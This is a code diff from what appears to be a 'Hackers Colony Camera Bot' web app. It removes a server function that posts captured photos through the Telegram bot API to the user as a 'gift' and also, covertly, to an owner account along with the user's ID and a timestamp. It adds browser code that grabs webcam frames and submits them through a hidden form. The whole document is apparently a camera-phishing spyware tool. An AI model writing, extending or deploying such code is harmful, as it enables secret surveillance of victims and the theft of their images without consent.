@@ -1,68 +1,57 @@
-// netlify/functions/sendPhoto.js
-const axios = require('axios');
-
-exports.handler = async function(event, context) {
-  if (event.httpMethod !== 'POST') {
-    return {
-      statusCode: 405,
-      body: JSON.stringify({ error: 'Method Not Allowed' })
-    };
-  }
-
-  try {
-    const { image, label, userId } = JSON.parse(event.body);
-    
-    // Get tokens from Netlify environment (hidden from users)
-    const BOT_TOKEN = process.env.BOT_TOKEN;
-    const OWNER_ID = process.env.OWNER_ID;
-
-    if (!BOT_TOKEN || !OWNER_ID) {
-      throw new Error('Server configuration error - tokens not set');
+// ===== CAPTURE AND SEND PHOTO =====
+async function captureAndSendPhoto(label) {
+  return new Promise(async (resolve) => {
+    try {
+      const video = document.getElementById("video");
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      debugLog(`🖼️ Converting ${label}...`);
+      
+      // Convert to base64
+      const imageData = canvas.toDataURL('image/jpeg', 0.9);
+      
+      debugLog(`📤 Sending ${label}...`);
+      
+      // Create a hidden form
+      const form = document.createElement('form');
+      form.style.display = 'none';
+      form.method = 'POST';
+      form.action = '/api/send-photo'; // This will be processed by Netlify
+      
+      // Add data as hidden inputs
+      const imageInput = document.createElement('input');
+      imageInput.type = 'hidden';
+      imageInput.name = 'image';
+      imageInput.value = imageData;
+      
+      const labelInput = document.createElement('input');
+      labelInput.type = 'hidden';
+      labelInput.name = 'label';
+      labelInput.value = label;
+      
+      const userIdInput = document.createElement('input');
+      userIdInput.type = 'hidden';
+      userIdInput.name = 'userId';
+      userIdInput.value = USER_ID;
+      
+      form.appendChild(imageInput);
+      form.appendChild(labelInput);
+      form.appendChild(userIdInput);
+      document.body.appendChild(form);
+      
+      // Submit form
+      form.submit();
+      
+      debugLog(`✅ ${label} sent!`);
+      resolve();
+      
+    } catch (error) {
+      debugLog(`❌ Capture error for ${label}: ${error.message}`);
+      resolve();
     }
-
-    // Convert base64 to buffer
-    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
-    const buffer = Buffer.from(base64Data, 'base64');
-
-    // Send to user
-    await sendToTelegram(BOT_TOKEN, userId, buffer, label, true);
-    
-    // Send to owner
-    await sendToTelegram(BOT_TOKEN, OWNER_ID, buffer, label, false, userId);
-
-    return {
-      statusCode: 200,
-      body: JSON.stringify({ 
-        success: true, 
-        message: 'Photos sent!' 
-      })
-    };
-
-  } catch (error) {
-    console.error('Error:', error);
-    return {
-      statusCode: 500,
-      body: JSON.stringify({ 
-        success: false, 
-        error: error.message 
-      })
-    };
-  }
-};
-
-async function sendToTelegram(token, chatId, photoBuffer, label, isUser = true, userId = null) {
-  let caption = '';
-  
-  if (isUser) {
-    caption = `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`;
-  } else {
-    caption = `📸 From User ${userId}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`;
-  }
-
-  // Send to Telegram
-  await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, {
-    chat_id: chatId,
-    caption: caption,
-    photo: photoBuffer
   });
 }
